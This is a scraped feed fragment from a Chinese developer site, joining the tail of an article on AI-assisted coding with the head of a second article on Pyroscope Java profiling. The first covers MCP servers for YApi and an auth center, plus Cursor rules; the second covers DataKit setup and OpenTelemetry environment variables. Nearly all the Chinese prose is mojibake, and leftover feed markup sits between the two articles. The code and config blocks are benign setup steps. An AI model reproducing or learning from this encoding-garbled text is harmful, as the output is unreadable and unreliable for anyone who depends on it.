<p>MCPï¼ˆModel Context Protocolï¼‰èƒ½è¿æ¥åˆ°å¤–éƒ¨ç³»ç»Ÿå’Œæ•°æ®ï¼Œè®©æ¨¡å‹çœŸæ­£<strong>ç†è§£é¡¹ç›®è¯­å¢ƒ</strong>ï¼Œå…·å¤‡â€œçœ‹å¾—è§ã€å¬å¾—æ‡‚ã€åšå¾—å‡†â€çš„èƒ½åŠ›ï¼Œæ˜¯ AI ç¼–ç ä¸­é‡è¦çš„â€œä¿¡æ¯ä¸­æ¢â€ã€‚æˆ‘ä»¬æ ¸å¿ƒ MCP åŒ…å«ä»¥ä¸‹ä¸¤ä¸ªï¼š</p>
<h4 data-id="heading-9">1. YApi MCP</h4>
<p>YApi æ˜¯ä¸€ä¸ªæ¥å£ç®¡ç†ä¸æ–‡æ¡£å¹³å°ï¼Œå‰åç«¯ç­‰è§’è‰²å¯åœ¨åŒä¸€å¹³å°æŸ¥çœ‹å¹¶å¯¹æ¥æ¥å£ï¼Œé¿å…æ²Ÿé€šæ··ä¹±ä¸ä¿¡æ¯ä¸ä¸€è‡´ç­‰é—®é¢˜ã€‚å¾—ç›Šäºåç«¯å›¢é˜Ÿé•¿æœŸã€è§„èŒƒåœ°ç»´æŠ¤ YApi æ–‡æ¡£ï¼Œæ¥å£ä¿¡æ¯å§‹ç»ˆä¿æŒå‡†ç¡®ã€å®Œæ•´ã€‚</p>
<p>åœ¨æ­¤åŸºç¡€ä¸Šï¼ŒYApi MCP è‡ªåŠ¨è·å–æ¥å£çš„è¯·æ±‚åœ°å€ã€å‚æ•°ã€å“åº”å­—æ®µç­‰å†…å®¹ï¼Œä¸ºæ¨¡å‹æä¾›æƒå¨ã€æœ€æ–°çš„ Api Specï¼Œä»æºå¤´ä¸Šé¿å…å¤§æ¨¡å‹å‡­çŒœæµ‹ç”Ÿæˆæ¥å£ä¿¡æ¯ã€‚</p>
<h4 data-id="heading-10">2. Auth-center MCP</h4>
<p>ä¸­å¤®æƒé™ç³»ç»Ÿæ˜¯å…¬å¸å†…éƒ¨æ‰€æœ‰ä¸­åå°ç³»ç»Ÿç»Ÿä¸€ç®¡ç†æƒé™çš„å¹³å°ã€‚</p>
<p>Auth-center MCP é€šè¿‡æ¥å£è°ƒç”¨çš„æ–¹å¼å¿«é€Ÿæ¥å…¥æƒé™ç³»ç»Ÿï¼ŒåŒ…æ‹¬æ¥å£è‡ªåŠ¨å®šçº§ã€èµ„æºè‡ªåŠ¨æ–°å¢ã€é¡µé¢æ¥å£ç»‘å®šç­‰æƒé™ç®¡ç†å…¨æµç¨‹é…ç½®ï¼Œæ—¢èƒ½æé«˜æ¥å…¥æ•ˆç‡ï¼Œæ›´èƒ½é¿å…äººå·¥æ“ä½œå¤±è¯¯ã€‚</p>
<p>åŸºæœ¬çš„ MCP é…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"auth-center-mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
            <span class="hljs-string">"-y"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-string">"auth-center-mcp"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-string">"--username=***"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-string">"--password=***"</span>
          <span class="hljs-punctuation">]</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"yapi-mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
            <span class="hljs-string">"-y"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-string">"yapi-mcp"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-string">"--yapiHost=***"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-string">"--username=***"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-string">"--password=***"</span>
          <span class="hljs-punctuation">]</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>

</code></pre>
<p>é€šè¿‡ MCP çš„æ¥å…¥ï¼Œæ¨¡å‹åƒæ˜¯è£…ä¸Šäº†â€œåƒé‡Œçœ¼â€ï¼Œä¸å†æ˜¯ä¸€ä¸ªâ€œé—­é—¨é€ è½¦â€çš„åŠ©æ‰‹ï¼Œè€Œæ˜¯èƒ½çœŸæ­£è¯»æ‡‚ä¸Šä¸‹æ–‡çš„å›¢é˜Ÿæˆå‘˜ã€‚</p>
<h3 data-id="heading-11">åˆ©å™¨ä¸‰ï¼šRules è®©ç”Ÿæˆä»£ç å…·å¤‡â€œä¸“ä¸šçº§æ°´å‡†â€</h3>
<p>å¤§æ¨¡å‹è™½ç„¶å¼ºå¤§ï¼Œä½†å®ƒå®¹æ˜“å¹»è§‰ç”Ÿæˆå†—ä½™ä¸”ä¸æ˜“ç»´æŠ¤çš„ä»£ç ï¼Œä¸ºäº†æ§åˆ¶å®ƒçš„è¾“å‡ºè´¨é‡ï¼Œæˆ‘ä»¬åˆ¶å®šäº†ä¸€ç³»åˆ— Spec å¹¶æ²‰æ·€åˆ° cursorçš„ rules æ–‡ä»¶ä¸­ï¼Œåœ¨ç¼–ç¨‹è¿‡ç¨‹ä¸­æä¾›æŒä¹…çš„ã€å¯å¤ç”¨çš„ä¸Šä¸‹æ–‡ï¼Œè¿™äº› Spec æ—¢æ˜¯å·¥ç¨‹çš„åº•çº¿ï¼Œä¹Ÿæ˜¯ AI çš„çŸ¥è¯†åº“ã€‚</p>
<p>åœ¨ä¼—å¤šrulesæ–‡ä»¶ä¸­ï¼Œæœ‰6ä¸ªå¯¹ç”Ÿæˆçš„ä»£ç è´¨é‡è‡³å…³é‡è¦ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"> ---
<span class="hljs-code">    description:
    globs:
    alwaysApply: true
    ---
</span>
<span class="hljs-code">    ## æ–‡ä»¶ç»„ç»‡
</span>
<span class="hljs-code">    é¡¹ç›®å¼€å‘è§„èŒƒå·²æŒ‰åŠŸèƒ½æ¨¡å—æ‹†åˆ†åˆ° `./rules/` ç›®å½•ä¸­ï¼š
</span>
<span class="hljs-bullet">    -</span> <span class="hljs-code">`project-overview.mdc`</span> - é¡¹ç›®æ¦‚è¿°å’Œæ ¸å¿ƒå¼€å‘åŸåˆ™
<span class="hljs-bullet">    -</span> <span class="hljs-code">`requirements-reading.mdc`</span> - è¯»å–éœ€æ±‚æ–‡æ¡£çš„è§„èŒƒ
<span class="hljs-bullet">    -</span> <span class="hljs-code">`api-development.mdc`</span> - æ¥å£è°ƒç”¨è§„èŒƒå’Œæ•°æ®æ ¼å¼å¤„ç†è§„èŒƒ
<span class="hljs-bullet">    -</span> <span class="hljs-code">`component-usage.mdc`</span> - å…¬å…±ç»„ä»¶ä½¿ç”¨è§„èŒƒ
<span class="hljs-bullet">    -</span> <span class="hljs-code">`forbidden-practices.mdc`</span> - ç¦æ­¢äº‹é¡¹å’Œå¸¸è§é”™è¯¯é¢„é˜²
<span class="hljs-bullet">    -</span> <span class="hljs-code">`auth-center.mdc`</span> - æ¥å…¥ä¸­å¤®æƒé™è§„èŒƒ
<span class="hljs-code">    ... å…¶ä»–rulesæ–‡ä»¶
</span></code></pre>
<ul>
<li>
<p><code>project-overview.mdc</code>ï¼šå®šä¹‰é¡¹ç›®çš„æ ¸å¿ƒå¼€å‘åŸåˆ™ä¸å·¥ç¨‹çº¦æŸï¼Œæä¾›æ ‡å‡†CRUDçš„æœ€ä½³å®è·µï¼Œæ˜¯æ‰€æœ‰ç”Ÿæˆä»»åŠ¡çš„æ€»çº²ï¼›</p>
</li>
<li>
<p><code>requirements-reading.mdc</code>ï¼šæŒ‡å¯¼å¤§æ¨¡å‹ä»éœ€æ±‚æ–‡æ¡£ä¸­ï¼Œç²¾å‡†è¯»å–é¡µé¢ç›¸å…³éœ€æ±‚å†…å®¹ï¼›</p>
</li>
<li>
<p><code>api-development.mdc</code>ï¼šè§„èŒƒæ¥å£è¯·æ±‚æ–¹å¼ï¼Œç¡®ä¿æ¥å£è°ƒç”¨åŠæ•°æ®å¤„ç†ç›¸å…³ä»£ç ç¬¦åˆå›¢é˜Ÿçº¦å®šï¼›</p>
</li>
<li>
<p><code>component-usage.mdc</code>ï¼šæŒ‡å¯¼å¤§æ¨¡å‹éµå¾ªè®¾è®¡è§„èŒƒï¼Œå¹¶æ­£ç¡®ä½¿ç”¨å…¬å…±ç»„ä»¶ï¼Œåœ¨é¿å…é‡å¤é€ è½®å­çš„åŒæ—¶ï¼Œè¿˜èƒ½åœ¨ç”Ÿæˆé˜¶æ®µå¯¹é½UIè§„èŒƒï¼›</p>
</li>
<li>
<p><code>auth-center.mdc</code>ï¼šæç¤ºå¤§æ¨¡å‹æ ¹æ®ä»£ç æ‰¾å‡ºé¡µé¢æ‰€æœ‰æ“ä½œæŒ‰é’®åŠå¯¹åº”æ¥å£ï¼Œç»„è£…æˆç‰¹å®šschemaæ•°æ®ï¼Œå¹¶è°ƒç”¨å¯¹åº”mcpï¼Œç¡®ä¿æƒé™æŒ‰éœ€æ¥å…¥ä¸­å¤®æƒé™ç³»ç»Ÿï¼›</p>
</li>
<li>
<p><code>forbidden-practices.mdc</code>ï¼šåˆ—å‡ºç¦æ­¢å†™æ³•ä¸å¸¸è§é”™è¯¯ï¼Œæ¯”å¦‚ç›´æ¥æ“ä½œ DOMã€è·³è¿‡ YApi æ–‡æ¡£ç›´æ¥å¼€å‘ç­‰ã€‚</p>
</li>
</ul>
<p>AI ç”Ÿæˆçš„ä»£ç ä¼šè‡ªåŠ¨å¯¹ç…§è¿™äº› rules è¿›è¡Œæ ¡éªŒï¼Œä¸ç¬¦åˆè§„èŒƒçš„éƒ¨åˆ†ä¼šè§¦å‘äºŒæ¬¡ä¿®æ­£ï¼Œæœ€ç»ˆè®© AI çš„è¾“å‡ºæ›´æ¥è¿‘èµ„æ·±å¼€å‘è€…çš„ä¸“ä¸šçº§æ°´å‡†ã€‚</p>
<h2 data-id="heading-12">å››ã€åç»­å±•æœ›ï¼šæˆ‘ä»¬è¿˜æƒ³åšæ›´å¤š</h2>
<p>ç›®å‰åªæ˜¯ AI Coding çš„ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬è¿˜å°†åŸºäº<strong>è§„èŒƒé©±åŠ¨å¼€å‘</strong>ç»§ç»­æ¢ç´¢ä»¥ä¸‹æ–¹å‘ï¼š</p>
<ul>
<li><strong>æ‰©å¤§è¦†ç›–é¢</strong>ï¼šç›®å‰ä¸»è¦æ”¯æŒéƒ¨åˆ†ä¸­åå°é¡¹ç›®çš„å¸¸è§„é¡µé¢ï¼Œåç»­ä¼šé€æ­¥æå‡ä¸­åå°é¡¹ç›®ä½¿ç”¨å æ¯”ï¼›åŒæ—¶æ‰©å±•åˆ°æ”¯æŒå¤æ‚äº¤äº’é¡µé¢ï¼›æ›´è¿›ä¸€æ­¥ï¼Œåšåˆ°èµ°å‡ºä¸­åå°é¡¹ç›®ï¼Œæ”¯æŒè¦æ±‚æ›´ä¸¥æ ¼ã€å½¢å¼æ›´å¤šå˜çš„Cç«¯ç³»ç»Ÿï¼›</li>
<li><strong>æ›´ç»†ç²’åº¦çš„å›æº¯ä¸ä¼˜åŒ–</strong>ï¼šè®© AI è¾“å‡ºè¿‡ç¨‹å…·å¤‡â€œå¯å›æ”¾â€ã€â€œå¯è§£é‡Šâ€ã€â€œå¯ä¼˜åŒ–â€çš„èƒ½åŠ›ï¼›</li>
<li><strong>å…¨æµç¨‹æ™ºèƒ½åŒ–ï¼š</strong> ä»ä¸Šæ¸¸æå‡ºä¸šåŠ¡éœ€æ±‚ï¼ˆæƒ³æ³•ï¼‰ï¼Œæ™ºèƒ½ç”Ÿæˆéœ€æ±‚æ–‡æ¡£ï¼Œå†åˆ°è‡ªåŠ¨ codingã€æµ‹è¯•ï¼Œæœ€åå®Œæˆè‡ªåŠ¨æäº¤å’Œéƒ¨ç½²ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pyroscope Java æ¥å…¥æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7583799807594086434</link>    <guid>https://juejin.cn/post/7583799807594086434</guid>    <pubDate>2025-12-15T10:54:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583799807594086434" data-draft-id="7583903159774085135" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pyroscope Java æ¥å…¥æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-15T10:54:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¯è§‚æµ‹æ€§ç”¨è§‚æµ‹äº‘"/> <meta itemprop="url" content="https://juejin.cn/user/2392958212523102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pyroscope Java æ¥å…¥æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392958212523102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¯è§‚æµ‹æ€§ç”¨è§‚æµ‹äº‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:54:22.000Z" title="Mon Dec 15 2025 10:54:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Pyroscope</h2>
<p>Pyroscope æ˜¯ Grafana å¼€æºçš„æŒç»­æ€§èƒ½åˆ†æå¹³å°ï¼Œæ—¨åœ¨å¸®åŠ©ç”¨æˆ·ä»åº”ç”¨ç¨‹åºä¸­è·å–æ€§èƒ½æ´å¯Ÿï¼Œä»¥ä¼˜åŒ–èµ„æºä½¿ç”¨ï¼Œå¦‚ CPUã€å†…å­˜å’Œ I/O æ“ä½œã€‚å°† Pyroscope æ•°æ®ä¸ŠæŠ¥åˆ°è§‚æµ‹äº‘ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿå…¨é¢äº†è§£åº”ç”¨ç¨‹åºçš„è¡Œä¸ºï¼Œå¹¶èƒ½å¤Ÿæ·±å…¥åˆ°ç‰¹å®šæœåŠ¡ä¸­è¿›è¡Œæ›´ç²¾ç¡®çš„æ ¹æºåˆ†æã€‚Pyroscope ä¸º OpenTelemetry è¡¥å…¨äº† Profiling èƒ½åŠ›ï¼ŒåŒæ—¶ï¼Œå¯ä»¥å®ç° Profiling ä¸ Tracing çš„å…³è”ã€‚</p>
<h3 data-id="heading-1">æ ¸å¿ƒåŠŸèƒ½</h3>
<ul>
<li>æŒç»­æ€§èƒ½åˆ†æï¼šé€šè¿‡æŒç»­åˆ†æåº”ç”¨ç¨‹åºçš„æ€§èƒ½ï¼Œå¸®åŠ©å›¢é˜Ÿå¿«é€Ÿè¯†åˆ«æ€§èƒ½ç“¶é¢ˆå¹¶ä¼˜åŒ–åº”ç”¨ç¨‹åºã€‚</li>
<li>ä½å¼€é”€å’Œé«˜æ•ˆå‹ç¼©ï¼šç¡®ä¿åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿›è¡Œæ€§èƒ½åˆ†ææ—¶å¯¹åº”ç”¨ç¨‹åºçš„æ€§èƒ½å½±å“æœ€å°ã€‚</li>
<li>å¤šè¯­è¨€æ”¯æŒï¼šå®¢æˆ·ç«¯ SDK æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼ŒåŒ…æ‹¬ Goã€Javaã€Pythonã€Rubyã€PHP å’Œ .NETã€‚</li>
<li>çµæ´»çš„éƒ¨ç½²æ–¹å¼ï¼šæ”¯æŒåœ¨å¤šç§ç¯å¢ƒä¸­éƒ¨ç½²ï¼ŒåŒ…æ‹¬ Kubernetes ç­‰ã€‚</li>
</ul>
<h3 data-id="heading-2">ä½¿ç”¨åœºæ™¯</h3>
<ul>
<li>ä¸»åŠ¨ä¼˜åŒ–ï¼šé€šè¿‡æŒç»­ç›‘æ§å‡å°‘èµ„æºæ¶ˆè€—ï¼Œæé«˜åº”ç”¨ç¨‹åºæ€§èƒ½ï¼Œé¢„é˜²å»¶è¿Ÿé—®é¢˜ã€‚</li>
<li>å¿«é€Ÿå“åº”ï¼šåœ¨å‘ç”Ÿæ€§èƒ½é—®é¢˜æ—¶ï¼Œèƒ½å¤Ÿå¿«é€Ÿå®šä½å¹¶è§£å†³ï¼Œä¾‹å¦‚è°ƒè¯• CPUã€å†…å­˜æˆ– I/O ç“¶é¢ˆã€‚</li>
</ul>
<h3 data-id="heading-3">æ”¯æŒç±»å‹</h3>
<p>Pyroscope æ”¯æŒé‡‡é›†ä»¥ä¸‹æ•°æ®ç±»å‹ï¼š</p>
<ul>
<li>CPU ä½¿ç”¨æƒ…å†µ</li>
<li>å†…å­˜ä½¿ç”¨æƒ…å†µ</li>
<li>I/O æ“ä½œ</li>
<li>è°ƒç”¨æ ˆï¼ˆCall Stacksï¼‰</li>
<li>åˆ†é…çš„å†…å­˜ï¼ˆHeap &amp; Allocationï¼‰</li>
<li>åç¨‹æˆ–çº¿ç¨‹çš„ä½¿ç”¨æƒ…å†µ</li>
<li>å‡½æ•°çº§æ€§èƒ½æ•°æ®</li>
</ul>
<h2 data-id="heading-4">æ¥å…¥è§‚æµ‹äº‘</h2>
<h3 data-id="heading-5">å®ç°è¯´æ˜</h3>
<p>OpenTelemtry é“¾è·¯ä¸ pyroscope profiling æ•°æ®å…³è”å®ç°åŸç†ï¼Œä¸»è¦æ˜¯é€šè¿‡ç»™ profiling å’Œ tracing æ³¨å…¥ runtime_id æ ‡ç­¾ã€‚</p>
<h3 data-id="heading-6">ä¸»æœºéƒ¨ç½²</h3>
<ul>
<li>å¼€å¯ opentelemetry åŠ pyroscope é‡‡é›†å™¨</li>
</ul>
<p>è¿›å…¥ DataKit å®‰è£…ç›®å½•ä¸‹ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¼€å¯opentelemetry  </span>
<span class="hljs-built_in">cd</span> /usr/local/datakit/conf.d/
<span class="hljs-built_in">cp</span> samples/opentelemetry.conf.sample opentelemetry.conf

<span class="hljs-comment"># å¼€å¯pyroscope </span>
<span class="hljs-built_in">cd</span> /usr/local/datakit/conf.d/
<span class="hljs-built_in">cp</span> samples/pyroscope.conf.sample  pyroscope.conf
</code></pre>
<ul>
<li>é‡å¯ DataKit</li>
</ul>

<pre><code class="hljs">datakit service -R
</code></pre>
<h3 data-id="heading-7">æ¥å…¥ JAVA åº”ç”¨</h3>
<ul>
<li>pyroscope-java æ˜¯åŸºäº async-profiler çš„å¢å¼ºç‰ˆæœ¬ã€‚</li>
<li>pyroscope-otel æ˜¯åŸºäº pyroscope-java å°è£…çš„ OpenTelemetry ç‰ˆæœ¬ï¼Œæ„åœ¨ä¸ OpenTelemetry APM è¿›è¡Œèåˆã€‚</li>
</ul>
<h4 data-id="heading-8">ä¸‹è½½ä¾èµ–</h4>
<ul>
<li>pyroscope-otel ä¸‹è½½åœ°å€ï¼šÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Frepo1.maven.org%2Fmaven2%2Fio%2Fpyroscope%2Fotel%2F0.11.0%2Fotel-0.11.0.jar%25EF%25BC%258C%25E9%2587%258D%25E5%2591%25BD%25E5%2590%258D%25E4%25B8%25BA" target="_blank" title="https://repo1.maven.org/maven2/io/pyroscope/otel/0.11.0/otel-0.11.0.jar%EF%BC%8C%E9%87%8D%E5%91%BD%E5%90%8D%E4%B8%BA" ref="nofollow noopener noreferrer">repo1.maven.org/maven2/io/pâ€¦</a>Â pyroscope-otel.jar</li>
<li>opentelemetry-java ä¸‹è½½åœ°å€ï¼šÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-java-instrumentation%2Freleases" target="_blank" title="https://github.com/open-telemetry/opentelemetry-java-instrumentation/releases" ref="nofollow noopener noreferrer">github.com/open-telemeâ€¦</a></li>
<li>Agent ä»£ç ä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgrafana%2Fotel-profiling-java%2Freleases" target="_blank" title="https://github.com/grafana/otel-profiling-java/releases" ref="nofollow noopener noreferrer">github.com/grafana/oteâ€¦</a></li>
</ul>
<h4 data-id="heading-9">å¯åŠ¨å‚æ•°</h4>
<p>java åº”ç”¨å¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼Œä¾›å‚è€ƒã€‚</p>
<p><em>æ³¨æ„ï¼š UUID ä¸ºæ³¨å…¥çš„éšæœºid ï¼Œç”¨äºå…³è”trace ä¸ profile çš„å…³è”id èµ‹å€¼ï¼Œéœ€è¦ç¡®ä¿UUID èƒ½æ­£å¸¸è¢«åº”ç”¨ã€‚</em></p>
<pre><code class="hljs language-ini" lang="ini">Shell
<span class="hljs-attr">UUID</span>=$(uuidgen) \ <span class="hljs-comment"># å®ä¾‹ç»´åº¦çš„uuidï¼Œä¿è¯å®ä¾‹çš„å”¯ä¸€æ€§</span>
<span class="hljs-attr">OTEL_SERVICE_NAME</span>=<span class="hljs-string">"springboot-server"</span> \
<span class="hljs-attr">OTEL_RESOURCE_ATTRIBUTES</span>=<span class="hljs-string">"runtime_id=$UUID,service.name=springboot-server,service.version=1.3.55,service.env=dev"</span> \
<span class="hljs-attr">OTEL_JAVAAGENT_EXTENSIONS</span>=./pyroscope-otel.jar \
<span class="hljs-attr">OTEL_TRACES_EXPORTER</span>=otlp \
<span class="hljs-attr">OTEL_EXPORTER_OTLP_PROTOCOL</span>=<span class="hljs-string">"grpc"</span> \
<span class="hljs-attr">OTEL_EXPORTER_OTLP_ENDPOINT</span>=<span class="hljs-string">"http://datakit-service.datakit:4317"</span> \

<span class="hljs-comment"># PYROSCOPE é…ç½®</span>
<span class="hljs-attr">PYROSCOPE_APPLICATION_NAME</span>=<span class="hljs-string">"springboot-server"</span> \
<span class="hljs-attr">OTEL_PYROSCOPE_START_PROFILING</span>=<span class="hljs-literal">true</span> \
<span class="hljs-attr">PYROSCOPE_FORMAT</span>=<span class="hljs-string">"jfr"</span> \
<span class="hljs-attr">PYROSCOPE_PROFILER_EVENT</span>=<span class="hljs-string">"cpu"</span> \
<span class="hljs-attr">PYROSCOPE_LABELS</span>=<span class="hljs-string">"runtime_id=$UUID,service=springboot-server,version=1.3.55,env=dev"</span> \
<span class="hljs-attr">PYROSCOPE_UPLOAD_INTERVAL</span>=<span class="hljs-string">"10s"</span> \
<span class="hljs-attr">PYROSCOPE_JAVA_STACK_DEPTH_MAX</span>=<span class="hljs-number">512</span> \
<span class="hljs-attr">PYROSCOPE_PROFILING_INTERVAL</span>=<span class="hljs-string">"10ms"</span> \
<span class="hljs-attr">PYROSCOPE_PROFILER_ALLOC</span>=<span class="hljs-number">512</span>k \
<span class="hljs-attr">PYROSCOPE_ALLOC_LIVE</span>=<span class="hljs-literal">true</span> \
